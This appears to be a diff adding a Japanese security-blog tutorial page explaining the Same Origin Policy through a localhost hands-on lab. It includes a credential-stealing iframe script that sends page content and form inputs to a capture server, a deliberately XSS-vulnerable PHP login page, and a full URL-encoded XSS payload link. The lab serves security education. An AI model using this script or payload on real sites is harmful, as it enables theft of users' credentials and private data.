@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<title>もしSOPがなかったら &middot; kuzushikiのぺーじ</title>
+	<link rel="canonical" href="https://kuzushiki.github.io/post/sop/note/">
+	<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+	
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-172115536-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'UA-172115536-1');
+</script>
+
+<meta property="og:site_name" content="kuzushikiのぺーじ" />
+<meta property="og:title" content="もしSOPがなかったら" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://kuzushiki.github.io/post/sop/note/" />
+<meta property="og:locale" content="ja_JP" />
+
+<meta property="og:image" content="https://kuzushiki.github.io/images/logo.png" />
+<meta property="og:description" content="はじめに 本記事は第４回 初心者のためのセキュリティ勉強会での発表と同じ内容になります。
+勉強会にて「ハンズオンがやりたい！」という意見があったので，発表中に行ったデモをハンズオン形式で公開することにしました。 興味のある方はトライしてみてください！" /><link rel="shortcut icon" href="https://kuzushiki.github.io/images/favicon.ico">
+</head>
+
+<body>
+	<a id="title" href="https://kuzushiki.github.io/" title="kuzushikiのぺーじ">
+		
+		<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+		
+		
+		<h1>kuzushikiのぺーじ</h1>
+		
+	</a>
+	
+	<h4>セキュリティに関することを書きたいですね</h4>
+	
+	<div id="social">
+		
+		
+		
+		<a href="https://github.com/kuzushiki" title="Github">
+			<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+		</a>
+		
+		
+		
+		<a href="https://twitter.com/kuzu7shiki" title="Twitter">
+			<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+		</a>
+		
+		
+		
+	</div>
+	<div class="links">
+		<a href="https://kuzushiki.github.io/">Home</a>
+		
+		<a href="https://kuzushiki.github.io/post/">Archive</a>
+		
+		
+		
+		
+		
+		<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+		
+		
+	</div>
+	<div class="postBody">
+		<div class="post">
+			<h1>もしSOPがなかったら</h1>
+			<span class="post-meta">Fri, Feb 12, 2021 - Read in 2 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#はじめに">はじめに</a></li>
+    <li><a href="#sopとは">SOPとは？</a></li>
+    <li><a href="#どんな制限がかかるのか">どんな制限がかかるのか？</a></li>
+    <li><a href="#本題">本題</a></li>
+    <li><a href="#ハンズオン環境について">ハンズオン環境について</a></li>
+    <li><a href="#解説">解説</a></li>
+    <li><a href="#まとめ">まとめ</a></li>
+  </ul>
+</nav>
+			<h2 id="はじめに">はじめに</h2>
+<p>本記事は<a href="https://sfb.connpass.com/event/202722/">第４回 初心者のためのセキュリティ勉強会</a>での発表と同じ内容になります。</p>
+<p>勉強会にて「ハンズオンがやりたい！」という意見があったので，発表中に行ったデモをハンズオン形式で<a href="https://github.com/kuzushiki/sop_demo">公開することにしました。</a>
+興味のある方はトライしてみてください！</p>
+<hr>
+<h2 id="sopとは">SOPとは？</h2>
+<p><strong>S</strong>ame <strong>O</strong>rigin <strong>P</strong>olicy （同一オリジンポリシー）の略で，<strong>異なるオリジンへのアクセスに制限がかかる</strong>，というものです。
+Webブラウザに標準搭載されているセキュリティ機構になります。</p>
+<p>ここで<strong>オリジン</strong>は，スキーム・ホスト名・ポート番号の組み合わせを意味します。</p>
+<p>このページを例に取ると，</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">https://kuzushiki.github.io/post/sop/note/
+</code></pre></div><ul>
+<li>https: スキーム</li>
+<li>kuzushiki.github.io: ホスト名</li>
+</ul>
+<p>となります。
+（ポート番号はデフォルトの値なので省略されています）</p>
+<hr>
+<h2 id="どんな制限がかかるのか">どんな制限がかかるのか？</h2>
+<p>アクセスしたページにて以下のコードが実行される場合を考えます。
+<code>iframe</code>タグによるページの埋め込みは可能ですが，埋め込まれたページの要素にアクセスすることができません。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;getTitle(this)&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">[異なるオリジン]</span> &gt;
+&lt;/<span style="color:#f92672">iframe</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTitle</span>(<span style="color:#a6e22e">elm</span>){
+        <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">elm</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">title</span>); <span style="color:#75715e">//SOPにより実行されない
+</span><span style="color:#75715e"></span>    }
+&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>実際に<code>Chrome</code>で試した結果は以下の通りです。</p>
+<p><img src="../img/2021-02-11-12-40-26.png" alt=""></p>
+<p>左：通常のブラウザ　右：SOPを無効にしたブラウザ</p>
+<p>通常のブラウザではアラートが出ずにエラーが表示されますが，
+SOPを無効にしたブラウザではアラートが出ていることがわかります。</p>
+<hr>
+<h2 id="本題">本題</h2>
+<p>それでは本題に入っていきます。<strong>もしSOPがなかったら</strong> 、どのような脅威が発生するのでしょうか？
+ハンズオンで確認してみましょう！</p>
+<p>ハンズオンは<a href="https://github.com/kuzushiki/sop_demo">こちら</a></p>
+<hr>
+<h2 id="ハンズオン環境について">ハンズオン環境について</h2>
+<ol>
+<li><strong>app</strong> (http://localhost:8001)</li>
+</ol>
+<p>通常のサーバ。ログイン機能があり、ログインするとなにかしら大事な情報が得られる、という設定です。</p>
+<ol start="2">
+<li><strong>evil_app</strong> (http://localhost:8002)</li>
+</ol>
+<p>攻撃者の罠サーバ。<code>app</code>ユーザのアカウント情報や秘密情報を窃取し<code>capture</code>サーバに送信します。</p>
+<ol start="3">
+<li><strong>capture</strong> (http://localhost:8003)</li>
+</ol>
+<p>攻撃者のサーバからの通信を待ち受けるサーバ。ここに<code>app</code>ユーザに関する情報が送られます。</p>
+<hr>
+<h2 id="解説">解説</h2>
+<p>ここからはハンズオンの解説になります。</p>
+<p>まずはSOPを有効にしたブラウザで<code>app</code>の動作を確認します。
+<code>http://localhost:8001</code>にアクセスすると，ログイン画面が確認できます。</p>
+<p><img src="../img/%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E7%94%BB%E9%9D%A2.png" alt=""></p>
+<p>認証情報（ID: <code>hoge</code> PW: <code>hoge</code>）を使ってログインしてみます。すると<code>ひみつのぺーじ</code>に遷移し，<code>hoge</code>さんの秘密を知ることができます。</p>
+<p><img src="../img/%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E5%BE%8C%E7%94%BB%E9%9D%A2.png" alt=""></p>
+<p><code>ログアウト</code>をクリックするとログアウトします。</p>
+<p><img src="../img/%E3%83%AD%E3%82%B0%E3%82%A2%E3%82%A6%E3%83%88.png" alt=""></p>
+<p>それではSOPを無効にしたブラウザで攻撃者のサーバである<code>evil_app</code>にアクセスします。
+<code>evil_app</code>のソースは以下の通りです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;getContent(this)&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://localhost:8001</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background-color:#FFFFFF;&#34;</span>&gt;
+    &lt;/<span style="color:#f92672">iframe</span>&gt;
+    &lt;<span style="color:#f92672">script</span>&gt;
+        <span style="color:#75715e">/*読み込みが発生したタイミングでコンテンツを窃取*/</span>
+        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getContent</span>(<span style="color:#a6e22e">elm</span>){
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">elm</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">title</span>;
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">elm</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>;
+            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://localhost:8003?content=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">title</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">body</span>));
+
+            <span style="color:#75715e">/*入力フォームがあったら送信時の入力値を窃取*/</span>
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">form</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">elm</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">form</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+                <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#66d9ef">function</span>(){
+                    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">inputs</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+                        <span style="color:#a6e22e">inputs</span> <span style="color:#f92672">+=</span> <span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">value</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;;&#34;</span>;
+                    }
+                    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://localhost:8003?input=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">inputs</span>));
+                });   
+            }
+        }
+    &lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p><code>iframe</code>タグにより異なるオリジンである<code>app</code>を読み込みます。
+読み込みが発生したタイミングで<code>title</code>および<code>body</code>タグの内容を取得し<code>capture</code>サーバに送信しようとします。
+さらに<code>form</code>タグが見つかった場合，<code>addEventListener</code>を用いてフォーム送信時の入力値も取得し，同様に送信しようとします。
+<code>http://localhost:8002</code>にアクセスすると，さきほどのログイン画面が表示されると同時に<code>docker-compose</code>を実行したコンソールに<code>capture</code>のログが表示されます。</p>
+<p><img src="../img/capture%E3%83%AD%E3%82%B0.png" alt=""></p>
+<p><code>?content=</code>以降の部分を<a href="https://gchq.github.io/CyberChef/">CyberChef</a>などを用いてURLデコードすると，<code>app</code>のコンテンツが送信されていることがわかります。</p>
+<p><img src="../img/cyberchef%E3%83%87%E3%82%B3%E3%83%BC%E3%83%89.png" alt=""></p>
+<p>フォームに認証情報を入力してログインしてみましょう。再び<code>capture</code>のログが表示されるはずです。</p>
+<p><img src="../img/capture%E3%83%AD%E3%82%B02.png" alt=""></p>
+<p>デコードしてみると，認証情報やログイン後ページの秘密情報が得られました。</p>
+<p><img src="../img/cyberchef%E3%83%87%E3%82%B3%E3%83%BC%E3%83%89(%E8%AA%8D%E8%A8%BC%E6%83%85%E5%A0%B1).png" alt=""></p>
+<p><img src="../img/cyberchef%E3%83%87%E3%82%B3%E3%83%BC%E3%83%89(%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E5%BE%8C%E3%83%9A%E3%83%BC%E3%82%B8).png" alt=""></p>
+<p>以上からわかるように，SOPが無効な場合は<code>app</code>のユーザに<code>evil_app</code>のURLを使わせることで，ユーザの機密情報を窃取することができてしまいます。</p>
+<p>次に，SOPが有効になっているブラウザで<code>evil_app</code>にアクセスしてみましょう。
+どうやらアクセスしても<code>capture</code>ログが表示されないようです。ブラウザの管理者コンソールを確認してみると，以下のエラーが発生していることがわかります。</p>
+<p><img src="../img/%E3%82%A8%E3%83%A9%E3%83%BC.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Uncaught DOMException: Blocked a frame with origin &#34;http://localhost:8002&#34; from accessing a cross-origin frame.
+    at getContent (http://localhost:8002/:7:43)
+    at HTMLIFrameElement.onload (http://localhost:8002/:2:241)
+</code></pre></div><p>SOPにより異なるオリジンへのアクセスに制限がかり，ユーザの機密情報を手に入れることができなくなります。
+通常SOPが無効になることはないため，このような攻撃については考えなくて良いですね！</p>
+<p>……本当にそうでしょうか？
+<code>app</code>のログイン画面のソースをよく見てみましょう。何か脆弱性はないでしょうか？</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">session_start</span>();
+$err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_GET[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
+    <span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;hoge&#34;</span>) {
+        <span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;pw&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;hoge&#34;</span>) {
+            $_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;id&#39;</span>];
+            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /index.php&#39;</span>);
+            <span style="color:#66d9ef">exit</span>;
+        } <span style="color:#66d9ef">else</span> {
+            $err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;パスワードが違います！&#34;</span>;
+        } 
+    } <span style="color:#66d9ef">else</span> {
+        $err <span style="color:#f92672">=</span>  $_GET[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;は無効なIDです！&#34;</span>;
+    }
+}
+<span style="color:#75715e">?&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+    &lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;ログイン&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">body</span>&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form1&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span>&gt;
+            ID: &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id&#34;</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+            PW: &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pw&#34;</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;送信&#34;</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+        &lt;<span style="color:#f92672">p</span>&gt;<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $err <span style="color:#75715e">?&gt;</span>&lt;/<span style="color:#f92672">p</span>&gt;
+    &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>実はエラーメッセージに<strong>クロスサイトスクリプティング</strong>（XSS）の脆弱性があります。
+<code>hoge</code>以外のIDを入力すると，<code>$_GET['id'] . &quot;は無効なIDです！&quot;</code>というエラーメッセージが出力されるのですが，
+ユーザの入力値である<code>$_GET['id'] </code>をエスケープせずに出力するため，スクリプトを注入することができます。</p>
+<p>試しにIDの部分に<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>を入力してみましょう。
+アラートが表示されます。</p>
+<p><img src="../img/%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88.png" alt=""></p>
+<p>スクリプトを注入されると何がまずいのでしょうか？</p>
+<p>はじめに<code>SOP</code>は<strong>異なるオリジンへのアクセスに制限がかる</strong>ものだと説明しました。
+<code>app</code>自体に<code>evil_app</code>のような悪意のあるスクリプトを注入した場合，<strong>同じオリジンからのアクセス</strong>になるため，SOPによる制限がかからなくなります。
+よってXSSを利用することでSOPが無効の場合と同様の攻撃が可能になります。</p>
+<p>また，このページではログイン情報を<code>GET</code>メソッドで送信しているため，getパラメータを付与したURLに<code>app</code>ユーザを誘導することにより，注入したスクリプトをユーザのブラウザで実行させることができます。
+以下のURLを<code>app</code>のユーザに踏ませましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://localhost:8001/login.php?id=%3Ciframe+onload%3D%22getContent%28this%29%22+src%3Dhttp%3A%2F%2Flocalhost%3A8001+style%3D%22position%3Afixed%3B+top%3A0%3B+left%3A0%3B+bottom%3A0%3B+right%3A0%3B+width%3A100%25%3B+height%3A100%25%3B+border%3Anone%3B+margin%3A0%3B+padding%3A0%3B+overflow%3Ahidden%3B+z-index%3A999999%3B+background-color%3A%23FFFFFF%3B%22%3E+++++%3C%2Fiframe%3E+++++%3Cscript%3E+++++++++%2F*%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%9F%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%A7%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%92%E7%AA%83%E5%8F%96*%2F+++++++++function+getContent%28elm%29%7B+++++++++++++let+title+%3D+elm.contentWindow.document.title%3B+++++++++++++let+body+%3D+elm.contentWindow.document.body.innerHTML%3B+++++++++++++fetch%28%22http%3A%2F%2Flocalhost%3A8003%3Fcontent%3D%22+%2B+encodeURIComponent%28title+%2B+%22%3A%22+%2B+body%29%29%3B++++++++++++++%2F*%E5%85%A5%E5%8A%9B%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%8C%E3%81%82%E3%81%A3%E3%81%9F%E3%82%89%E9%80%81%E4%BF%A1%E6%99%82%E3%81%AE%E5%85%A5%E5%8A%9B%E5%80%A4%E3%82%92%E7%AA%83%E5%8F%96*%2F+++++++++++++let+form+%3D+elm.contentWindow.document.forms%5B0%5D%3B+++++++++++++if+%28form+%21%3D+null%29+%7B+++++++++++++++++form.addEventListener%28%22submit%22%2C+function%28%29%7B+++++++++++++++++++++let+inputs+%3D+%22%22%3B+++++++++++++++++++++for+%28let+i+%3D+0%3B+i+%3C+this.length%3B+i%2B%2B%29+%7B+++++++++++++++++++++++++inputs+%2B%3D+this%5Bi%5D.name+%2B+%22%3A%22+%2B+this%5Bi%5D.value+%2B+%22%3B%22%3B+++++++++++++++++++++%7D+++++++++++++++++++++fetch%28%22http%3A%2F%2Flocalhost%3A8003%3Finput%3D%22+%2B+encodeURIComponent%28inputs%29%29%3B+++++++++++++++++%7D%29%3B++++++++++++++++%7D+++++++++%7D+++++%3C%2Fscript%3E&amp;pw=
+</code></pre></div><p>一見長くて複雑そうに見えますが，以下の手順で簡単に作成できます。</p>
+<ol>
+<li><code>evil_app</code>のソースの<code>&lt;iframe&gt;</code>から<code>&lt;/script&gt;</code>までをコピーします。</li>
+<li>IDに入力して送信します。</li>
+<li>アドレスバーに表示されるURLをコピーして貼り付けます。</li>
+</ol>
+<p>このURLに誘導されたユーザがログインをすると，SOP無効時と同様にユーザの認証情報やログイン後ページの情報が窃取されてしまいます。</p>
+<p><img src="../img/%E7%AA%83%E5%8F%96%E3%81%95%E3%82%8C%E3%81%9F.png" alt=""></p>
+<p>以上でハンズオンは終わりです。お疲れさまでした！</p>
+<hr>
+<h2 id="まとめ">まとめ</h2>
+<p>デフォルトで有効になっている機能でありあまり意識することはないかもしれないですが，ハンズオンを通して<strong>SOP</strong>が大事な機能であることを確認しました。
+<strong>クロスサイトスクリプティング</strong>の脆弱性が存在した場合，同一オリジンのページに任意のスクリプトを注入することでSOPを回避できるので注意が必要です。</p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2020 kuzushiki
+		</p>
+		
+	</body>
+</html>
+
